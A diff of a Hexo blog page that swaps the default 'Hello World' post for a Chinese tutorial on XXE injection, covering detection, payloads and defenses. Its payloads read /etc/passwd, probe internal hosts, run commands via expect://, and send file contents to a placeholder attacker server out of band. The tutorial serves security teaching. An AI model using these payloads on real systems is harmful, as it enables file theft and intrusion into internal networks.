@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, Hexo">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="XXE漏洞介绍, Hexo">
+    <meta name="description" content="XXE漏洞前置知识：    
+​    XML被设计为传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。其焦点是数据的内容。 详情–&amp;gt;XML基础介绍
+XXE漏洞简介​    XXE（XML Exter">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | Hexo</title>
+    <title>XXE漏洞介绍 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">XXE漏洞介绍</h1>
                 </div>
             </div>
         </div>
@@ -428,9 +430,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+                                <span class="chip bg-color">web安全基础</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -442,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-14
+                    2022-01-15
                 </div>
                 
 
@@ -451,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    73
+                    1.2k
                 </div>
                 
 
@@ -471,19 +477,178 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p><strong>前置知识：</strong>    </p>
+<p>​    XML被设计为传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。其焦点是数据的内容。 详情–&gt;<a href="">XML基础介绍</a></p>
+<h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>​    <strong>XXE</strong>（XML External Entity Injection）即<strong>XML</strong>外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+<h2 id="XXE漏洞触发点"><a href="#XXE漏洞触发点" class="headerlink" title="XXE漏洞触发点"></a>XXE漏洞触发点</h2><p>可以上传XML文件的位置且未对XML文件进行过滤</p>
+<h2 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h2><ul>
+<li>Content-Type值判断</li>
+</ul>
+<p>​    可以使用BurpSuite抓取数据包查看。若<code>Content-type=text/xml</code>或<code>Content-type=application/xml</code>；表示接收数据为xml格式，可进行漏洞检测。</p>
+<ul>
+<li><p>更改Content-Type为xml类型进行尝试</p>
+</li>
+<li><p>数据格式类型判断</p>
+</li>
+</ul>
+<p>​    类似于<code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code>典型xml格式</p>
+<h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><p><strong>补充：支持的协议</strong></p>
+<table>
+<thead>
+<tr>
+<th>Libxml2</th>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>https</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>comepress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>comepress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher *</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p><strong>协议</strong></p>
+<ul>
+<li>读文件-通过DTD外部实体声明</li>
+</ul>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a[
+    &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li><p>内网探针-将xxe转换为ssrf</p>
+<p>我们利用这种方法可进行内网探测：某个内网ip是否存在、对应路径文件是否存在、端口扫描等等。根据返回类型(无回显可尝试根据响应时间长度判断)的不同来判断我们想要的结果。例如：请求正确时界面无变化、请求错误时进行报错。如下测试内网是否存在ip:192.168.0.103、该ip是否开启80端口、是否存在index.txt文件。</p>
+</li>
+</ul>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+&lt;!DOCTYPE a[
+    &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:80&#x2F;index.txt&#x2F;&quot;&gt;
+]&gt;
+&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>RCE（此类型在实战中并不常见，须在安装expect扩展的PHP环境里执行命令）</li>
+</ul>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+&lt;!DOCTYPE a[
+    &lt;!ENTITY b SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;            &lt;!--id为执行的系统命令--&gt;
+]&gt;
+&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>外部应用</strong></p>
+<ul>
+<li>引入外部实体</li>
+</ul>
+<p>在自己的服务器下放一个evil.dtd文件，通过DTD外部实体声明引入DTD文档<code>http://example.com/evil.dtd</code>，再通过解析evil.dtd文件引入外部实体声明。</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+       &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;evil.dtd&quot;&gt;
+]&gt;
+&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;
+ 
+&lt;!--http:&#x2F;&#x2F;example.com&#x2F;evil.dtd内容为--&gt;
+&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="无回显（Blind-XXE）"><a href="#无回显（Blind-XXE）" class="headerlink" title="无回显（Blind XXE）"></a>无回显（Blind XXE）</h3><p><strong>OOB(Out-Of-Band)：</strong>使用Blind XXE 漏洞来构建一条外带数据OOB（Out-Of-Band）通道来读取数据。</p>
+<p>​    原理：带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了-反向链接配合。</p>
+<p><strong>实例</strong>：<code> xxx.dtd</code>文件内容：<br><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;  </code></p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY % hs SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;
+ 		&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;	&lt;!--在自己的服务器创建xxx.dtd文件--&gt;
+		%remote;																				&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;
+		%all;																						&lt;!--替换为后边的嵌套实体--&gt;
+]&gt;
+&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;																	&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为了读取数据的准确性这里可以用<strong>base64</strong>进行将读取内容进行编码。如下：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY % hs SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;C:&#x2F;1.txt&quot;&gt;
+ 		&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;	&lt;!--在自己的服务器创建xxx.dtd文件--&gt;
+		%remote;																				&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;
+		%all;																						&lt;!--替换为后边的嵌套实体--&gt;
+]&gt;
+&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;																	&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h2><ul>
+<li>禁用外部实体</li>
+</ul>
+<p>禁用外部实体方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">PHP：
+libxml_disable_entity_loader(true);
+ 
+JAVA:
+DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+ 
+Python：
+from lxml import etree
+xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p>过滤用户提交xml数据</p>
+<p>关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code></p>
+</li>
+</ul>
 
                 
             </div>
@@ -500,7 +665,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">白芨</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -510,7 +675,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/01/14/hello-world/">http://jaasenyi.github.io/2022/01/14/hello-world/</a>
+                    <a href="http://jaasenyi.github.io/2022/01/15/xxe-lou-dong/">http://jaasenyi.github.io/2022/01/15/xxe-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -523,7 +688,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">白芨</a>
                     !
                 </span>
             </div>
@@ -547,7 +712,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+                                    <span class="chip bg-color">web安全基础</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -719,54 +888,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/15/wen-jian-bao-han/">
+                <a href="/2022/01/15/xxe-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含漏洞">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="XXE漏洞介绍">
                         
-                        <span class="card-title">文件包含漏洞</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            白芨
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/01/14/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">XXE漏洞介绍</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -777,17 +910,70 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            白芨
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">web安全基础</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/01/15/xml-ji-chu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="XML基础介绍">
+                        
+                        <span class="card-title">XML基础介绍</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            白芨
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">web安全基础</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
